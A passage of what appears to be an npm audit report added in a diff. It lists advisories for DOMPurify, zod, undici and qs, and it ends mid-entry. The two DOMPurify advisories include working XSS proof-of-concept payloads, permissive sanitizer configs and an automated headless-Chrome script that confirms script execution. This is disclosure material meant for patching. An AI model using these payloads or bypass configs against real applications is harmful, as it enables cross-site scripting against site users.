+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-mrv2-3pqr-j5jr\n- https://github.com/cure53/DOMPurify/pull/1672\n- https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.17\n- https://github.com/advisories/GHSA-mrv2-3pqr-j5jr",
+      "created": "2026-10-22T16:24:52.000Z",
+      "id": 1242881,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `<img onerror>` that was already loading fires after `sanitize()` returns.\n\nThe README says: \"Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `<img onload>` that was already loading when you built the live tree cannot fire after `sanitize()` returns.\" That does not hold when the detached node is not the hook's own node.\n\n### Tested versions\n\n- 3.4.16 (latest) and main at 18f8f0e\n- also 3.4.15, 3.4.12 and 2.5.8\n\njsdom for the matrix below, and Chromium (Playwright) for the event actually firing.\n\n### Details\n\n`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:\n\n```js\nif (currentNode === root || getParentNode(currentNode) !== null) {\n  return false;\n}\nif (IN_PLACE) {\n  _neutralizeSubtree(currentNode);\n}\n```\n\nIt only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.\n\n### PoC (jsdom)\n\n```js\nconst { JSDOM } = require('jsdom')\nconst createDOMPurify = require('dompurify')\nconst win = new JSDOM('<!doctype html><body></body>').window\nconst doc = win.document\n\nfor (const mode of ['self', 'parent', 'nextSibling']) {\n  const DOMPurify = createDOMPurify(win)\n  doc.body.innerHTML = '<div id=root><figure><img class=bad src=a.png>' +\n    '<img id=evil src=x onerror=alert(1)></figure><p>ok</p></div>'\n  const root = doc.getElementById('root')\n  const evil = doc.getElementById('evil')\n\n  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)\n  DOMPurify.addHook('afterSanitizeAttributes', (node) => {\n    if (node.getAttribute && node.getAttribute('class') === 'bad') {\n      if (mode === 'self') node.remove()\n      if (mode === 'parent') node.parentNode.remove()\n      if (mode === 'nextSibling') node.nextElementSibling.remove()\n    }\n  })\n\n  DOMPurify.sanitize(root, { IN_PLACE: true })\n  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))\n}\n```\n\nOutput on 3.4.16:\n\n```\n3.4.16 self        onerror = null\n3.4.16 parent      onerror = \"alert(1)\"\n3.4.16 nextSibling onerror = \"alert(1)\"\n```\n\nIn `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes` and `afterSanitizeAttributes`.\n\n### PoC (browser)\n\nThe same thing in a real page, served from 127.0.0.1 and opened in Chromium:\n\n```html\n<!doctype html><meta charset=utf-8>\n<script src=\"purify.min.js\"></script>\n<body><pre id=log></pre>\n<script>\nwindow.fired = [];\nfunction run(mode) {\n  const D = DOMPurify(window);\n  D.addHook('afterSanitizeAttributes', n => {\n    if (n.getAttribute && n.getAttribute('class') === 'bad') {\n      if (mode === 'parent') n.parentNode.remove();\n      if (mode === 'self') n.remove();\n    }\n  });\n  const root = document.createElement('div');\n  document.body.appendChild(root);\n  root.innerHTML = '<figure><img class=bad src=data:,><img src=x onerror=\"fired.push(\\'' + mode + '\\')\"></figure><p>ok</p>';\n  D.sanitize(root, { IN_PLACE: true });\n  return root.outerHTML;\n}\nconst a = run('self'), b = run('parent');\nsetTimeout(() => {\n  document.getElementById('log').textContent =\n    'version=' + DOMPurify.version + '\\nself out=' + a + '\\nparent out=' + b + '\\nfired=' + JSON.stringify(fired);\n}, 1500);\n</script>\n```\n\nResult on 3.4.16:\n\n```\nversion=3.4.16\nself out=<div><figure><img src=\"x\"></figure><p>ok</p></div>\nparent out=<div><p>ok</p></div>\nfired=[\"parent\"]\n```\n\nThe returned tree is clean in both cases, but the handler on the detached image runs in the page for `parent`.\n\n### Impact\n\nAn app that uses `IN_PLACE` with a hook that removes a wrapper or a nearby element (for example \"drop the whole `<figure>` if its image is not allowed\") gets DOM XSS from attacker markup after `sanitize()` returns. It needs that kind of hook, so it falls under \"input plus an application choice\" in SECURITY.md, but it breaks the guarantee the README gives for hook detached nodes and is the same pattern as GHSA-55q2-fjhq-7xh7 and GHSA-p98j-92pf-mc4p.\n\n### Suggested fix\n\nInstead of only checking `currentNode`, check after each hook call whether anything outside the current node was detached. Two simple options:\n\n- before calling a hook in `IN_PLACE` mode, remember the next node the walker will visit and the current node's ancestors; after the hook, neutralize any of them that are no longer attached under `root`\n- or, after the walk, neutralize every element that was in the original tree but is no longer connected to `root` (for example by collecting the elements before the walk)",
+      "reported_by": null,
+      "title": "DOMPurify IN_PLACE: hook that removes a parent or sibling leaves the detached subtree's event handlers armed (incomplete fix for GHSA-p98j-92pf-mc4p)",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.4.16",
+      "github_advisory_id": "GHSA-mrv2-3pqr-j5jr",
+      "recommendation": "Upgrade to version 3.4.17 or later",
+      "patched_versions": ">=3.4.17",
+      "updated": "2026-10-22T16:24:53.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-693"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrv2-3pqr-j5jr"
+    },
+    "1242882": {
+      "findings": [
+        {
+          "version": "3.4.15",
+          "paths": [
+            ".>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-c6gr-qvv4-5v3f\n- https://github.com/cure53/DOMPurify/pull/1672\n- https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.17\n- https://github.com/advisories/GHSA-c6gr-qvv4-5v3f",
+      "created": "2026-10-22T16:24:23.000Z",
+      "id": 1242882,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nDOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `\"attributename\"` never matches and the guard does nothing.\n\nAn app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName=\"href\" values=\"x;javascript:alert(1)\">`. Clicking the parent link then runs the script.\n\nThis needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.\n\n### Details\n\nIn `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):\n\n```js\nconst lcName = transformCaseFunc(name);\n...\nif (lcName === \"attributename\" && stringMatch(value, \"href\")) {\n  _removeAttribute(name, currentNode, attr);\n  continue;\n}\n```\n\n`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.\n\nPeople using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.\n\nThe value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill=\"freeze\"`, the last entry ends up as the effective href of the parent `<a>`.\n\nIn text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.\n\nThis is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.\n\n### Proof of concept\n\nTested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.\n\nConfig:\n\n```js\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\n```\n\n`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.\n\nInput:\n\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>\n```\n\nSteps:\n\n1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.\n\n```html\n<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>\n<script src=\"purify.js\"></script></head><body><div id=\"sink\"></div>\n<script>//<![CDATA[\nconst cfg = {\n  PARSER_MEDIA_TYPE: 'application/xhtml+xml',\n  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n};\nconst dirty = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\"><a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/><text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nconst clean = DOMPurify.sanitize(dirty, cfg);\nconsole.log(clean);\ndocument.getElementById('sink').innerHTML = clean;\n//]]></script></body></html>\n```\n\n2. The logged output still contains `attributeName=\"href\"` and `values=\"x;javascript:alert(1)\"`.\n3. `document.getElementById('q').href.animVal` returns `\"javascript:alert(1)\"`.\n4. Click \"click\" and `alert(1)` runs.\n\nAs a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `\"\"`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.\n\nAn automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.\n\n<details>\n<summary>poc.sh</summary>\n\n```bash\n#!/usr/bin/env bash\n# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.\n#\n# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:\"application/xhtml+xml\"\n# config that allow-lists <animate> + attributeName, renders the output into\n# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse\n# event and reports whether alert() fired. Also runs the same allowlist in\n# text/html mode as a control (DOMPurify strips attributeName there).\n#\n# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)\n#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh\n#         CHROME=/path/to/chrome ./poc.sh\n# needs:  node >= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.\n# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error\nset -euo pipefail\nVER=\"${1:-3.4.16}\"\nWORK=\"$(mktemp -d)\"\ntrap 'rm -rf \"$WORK\"' EXIT\n\nif [ -z \"${DOMPURIFY_JS:-}\" ]; then\n  (cd \"$WORK\" && npm pack \"dompurify@$VER\" --silent >/dev/null 2>&1 && tar xzf dompurify-*.tgz) || { echo \"npm pack dompurify@$VER failed\" >&2; exit 2; }\n  DOMPURIFY_JS=\"$WORK/package/dist/purify.js\"\nfi\nif [ -z \"${CHROME:-}\" ]; then\n  for c in \"$HOME\"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \\\n           \"$HOME\"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \\\n           \"$(command -v google-chrome || true)\" \"$(command -v chromium || true)\" \"$(command -v chromium-browser || true)\"; do\n    [ -n \"$c\" ] && [ -x \"$c\" ] && CHROME=\"$c\" && break\n  done\nfi\n[ -n \"${CHROME:-}\" ] || { echo \"no Chrome/Chromium found; set CHROME=\" >&2; exit 2; }\n\ncat > \"$WORK/poc.html\" <<'EOF'\n<!doctype html><meta charset=\"utf-8\"><title>poc</title>\n<script src=\"purify.js\"></script>\n<div id=\"sink\"></div>\n<script>//<![CDATA[\nconst payload = '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"60\">' +\n  '<a id=\"q\"><animate attributeName=\"href\" values=\"x;javascript:alert(1)\" dur=\"0.01s\" fill=\"freeze\"/>' +\n  '<text x=\"10\" y=\"40\" font-size=\"30\">click</text></a></svg>';\nfunction run(mode) {\n  const cfg = {\n    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],\n    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],\n  };\n  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';\n  const clean = DOMPurify.sanitize(payload, cfg);\n  document.getElementById('sink').innerHTML = clean;\n  return clean;\n}\n//]]></script>\nEOF\ncp \"$DOMPURIFY_JS\" \"$WORK/purify.js\"\n# Same test inside a real XHTML document (no HTML<->XHTML context flip):\n# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.\nsed -e 's#<!doctype html><meta charset=\"utf-8\"><title>poc</title>#<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>poc</title>#' \\\n    -e 's#<script src=\"purify.js\"></script>#<script src=\"purify.js\"></script></head><body>#' \\\n    -e 's#^</script>$#</script></body></html>#' \"$WORK/poc.html\" > \"$WORK/poc.xhtml\"\n\ncat > \"$WORK/drive.js\" <<'EOF'\n// zero-dependency CDP driver over --remote-debugging-pipe\nconst { spawn } = require('child_process');\nconst [chrome, url, dir] = process.argv.slice(2);\nconst xurl = url.replace(/\\.html$/, '.xhtml');\nconst p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',\n  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });\nlet id = 0, buf = ''; const pend = new Map(), dialogs = [];\np.stdio[4].on('data', (d) => {\n  buf += d; let i;\n  while ((i = buf.indexOf('\\0')) >= 0) {\n    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);\n    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }\n    else if (m.method === 'Page.javascriptDialogOpening') {\n      dialogs.push(m.params.message);\n      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);\n    }\n  }\n});\nfunction send(method, params = {}, sessionId) {\n  return new Promise((r) => { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\\0'); });\n}\nconst sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n(async () => {\n  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });\n  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });\n  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);\n  const ev = async (e) => (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;\n  let vulnerable = false, xhtmlDoc = false;\n  const ver = async () => ev('DOMPurify.version');\n  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {\n    await send('Page.navigate', { url: page }, s); await sleep(500);\n    const docType = await ev('document.contentType');\n    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\\\/[\\\\d.]+/)[0]'));\n    dialogs.length = 0;\n    const clean = await ev(`run(${JSON.stringify(mode)})`);\n    await sleep(400); // let the 0.01s animation apply (fill=freeze)\n    const href = await ev(`(()=>{const a=document.getElementById('q');return a?a.href.animVal:null})()`);\n    const box = await ev(`(()=>{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);\n    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])\n      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);\n    await sleep(800);\n    console.log(`\\n[${mode} mode, sink document ${docType}] sanitized output:\\n  ${clean}`);\n    console.log(`  animated <a> href (animVal): ${JSON.stringify(href)}`);\n    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);\n    if (mode === 'xhtml' && dialogs.length) vulnerable = true;\n    if (mode === 'xhtml' && docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length > 0;\n  }\n  console.log(vulnerable ? `\\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\\nRESULT: not vulnerable');\n  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);\n})().catch((e) => { console.error(e); p.kill('SIGKILL'); process.exit(2); });\nEOF\nnode \"$WORK/drive.js\" \"$CHROME\" \"file://$WORK/poc.html\" \"$WORK\"\n```\n\n</details>\n\n### Impact\n\nStored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.",
+      "reported_by": null,
+      "title": "DOMPurify: SMIL attributeName=href guard is skipped when PARSER_MEDIA_TYPE is application/xhtml+xml",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.4.16",
+      "github_advisory_id": "GHSA-c6gr-qvv4-5v3f",
+      "recommendation": "Upgrade to version 3.4.17 or later",
+      "patched_versions": ">=3.4.17",
+      "updated": "2026-10-22T16:24:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-c6gr-qvv4-5v3f"
+    },
+    "1243066": {
+      "findings": [
+        {
+          "version": "4.6.5",
+          "paths": [
+            ".>eslint-config-next>eslint-plugin-react-hooks>zod"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
+      "created": "2026-10-01T18:32:46.000Z",
+      "id": 1243066,
+      "npm_advisory_id": null,
+      "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+      "reported_by": null,
+      "title": "Zod can exhaust memory while validating oversized constrained collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-54404"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "zod",
+      "vulnerable_versions": "<4.6.6",
+      "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+      "recommendation": "Upgrade to version 4.6.6 or later",
+      "patched_versions": ">=4.6.6",
+      "updated": "2026-10-23T18:26:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+    },
+    "1243077": {
+      "findings": [
+        {
+          "version": "8.11.2",
+          "paths": [
+            ".>jsdom>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-4qv8-2p9j-2685\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109924\n- https://github.com/nodejs/undici/commit/299162740d5f39120092277e70efacb4d151c1c6\n- https://github.com/nodejs/undici/commit/789ef26461c648480433846607154f52d74ec9ab\n- https://github.com/nodejs/undici/commit/c43b23fdc6b37e1283d4347408bb16800f867d9e\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-4qv8-2p9j-2685",
+      "created": "2026-10-23T22:13:29.000Z",
+      "id": 1243077,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `EventSource` client can be driven to exhaust process memory by a malicious or compromised Server-Sent Events peer. By sending millions of tiny completed `data:` fields with no blank event separator, or a single unfinished line split across many chunks, the parser retains a growing amount of per-field and per-chunk state. The byte-based `maxEventSize` and `maxResponseSize` limits do not bound that retained state, and `maxResponseSize` is enforced on the compressed body before decompression, so a small compressed response can expand into enough retained memory to terminate the process. The application only needs to maintain an `EventSource` connection to an untrusted peer, which controls only the response. Availability is the only impact.\n\n### Patches\n\nUpgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which bound the retained EventSource parser state (the number of `data` fields and buffered chunks, the unfinished-line length, and per-field byte totals) independently of the byte limits.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unbounded memory in the EventSource parser",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109924"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-4qv8-2p9j-2685",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-23T22:13:31.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-4qv8-2p9j-2685"
+    },
+    "1243080": {
+      "findings": [
+        {
+          "version": "8.11.2",
+          "paths": [
+            ".>jsdom>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-f72v-6w45-q472\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109841\n- https://github.com/nodejs/undici/commit/18bc8a1e09d15bc45815154a289dcf6fd5254d00\n- https://github.com/nodejs/undici/commit/4f7ef6806e532ab9e29ccd6229b1b9d241e1b1f0\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-f72v-6w45-q472",
+      "created": "2026-10-23T22:12:57.000Z",
+      "id": 1243080,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `fetch()` verifies Subresource Integrity (SRI) metadata by looking up the algorithm token in a lowercase-only set, but the SRI specification defines a valid token by its ASCII-lowercase form. A correct but non-lowercase token such as `SHA256-...` or `Sha256-...` is therefore treated as unknown and skipped. When no recognized algorithm remains, undici treats the integrity list as empty and accepts the response, so a server that returns a body different from the pinned digest passes the check.\n\nAn application that pins a response with a valid uppercase or mixed-case SRI token receives attacker-controlled bytes with no integrity error. The attacker needs only to control the response body, not the application's integrity metadata. The issue affects response integrity only. The regression was introduced in undici 7.15.0; releases 7.14.0 and earlier lowercase the token and are not affected.\n\n### Patches\n\nUpgrade to `7.30.1` or `8.12.2`. undici now normalizes the algorithm token to ASCII lowercase before validating it and before selecting the strongest algorithm, so case variants of SHA-256, SHA-384, and SHA-512 are verified correctly.\n\n### Workarounds\n\nUse lowercase algorithm tokens (`sha256`, `sha384`, `sha512`) in `integrity` metadata.",
+      "reported_by": null,
+      "title": "undici vulnerable to Subresource Integrity bypass via non-lowercase algorithm tokens",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109841"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-f72v-6w45-q472",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-23T22:13:18.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-178"
+      ],
+      "url": "https://github.com/advisories/GHSA-f72v-6w45-q472"
+    },
+    "1243112": {
+      "findings": [
+        {
+          "version": "8.11.2",
+          "paths": [
+            ".>jsdom>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-xjj6-f33q-929c\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109869\n- https://github.com/nodejs/undici/commit/07ded4941b1e72afec862958c3b8ddf468f3b429\n- https://github.com/nodejs/undici/commit/1325a87dfb3492f8e87e6b0a84b3bda4e82e3436\n- https://github.com/nodejs/undici/commit/b5084c7dc239172d75c336b1cd51ddac023938a5\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-xjj6-f33q-929c",
+      "created": "2026-10-23T22:14:31.000Z",
+      "id": 1243112,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `fetch()` crashes the Node.js process when a malicious server returns a response with more than five content codings and closes the connection before sending the body. undici rejects such responses (a content-encoding limit), but it created the internal response stream before that check and returned without attaching an error listener or aborting the request. The early close then surfaces a content-length mismatch on that orphaned internal stream, which Node.js treats as an unhandled `error` and terminates the process. A remote, unauthenticated server can trigger this with a single response, even when the application correctly catches the `fetch()` rejection. undici 6.x, 7.x, and 8.x are affected.\n\n### Patches\n\nUpgrade to `6.29.1`, `7.30.1`, or `8.12.2`. undici now validates the content-encoding chain before creating the internal body stream and aborts the response when the limit is exceeded, so no error can surface on an orphaned stream.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unhandled error on excessive content-encodings",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109869"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-xjj6-f33q-929c",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-23T22:14:32.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-xjj6-f33q-929c"
+    },
+    "1243452": {
+      "findings": [
+        {
+          "version": "6.16.0",
+          "paths": [
+            ".>@refinedev/core>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-6pq8-jhm2-2vcw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110816\n- https://github.com/ljharb/qs/commit/a952e7519338ef0cfb25694a2988848f93333727\n- https://github.com/ljharb/qs/releases/tag/v6.16.1\n- https://github.com/advisories/GHSA-6pq8-jhm2-2vcw",
+      "created": "2026-10-27T16:10:55.000Z",
+      "id": 1243452,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.\n\n## Root Cause\n\nWhen `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `\"string\"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the 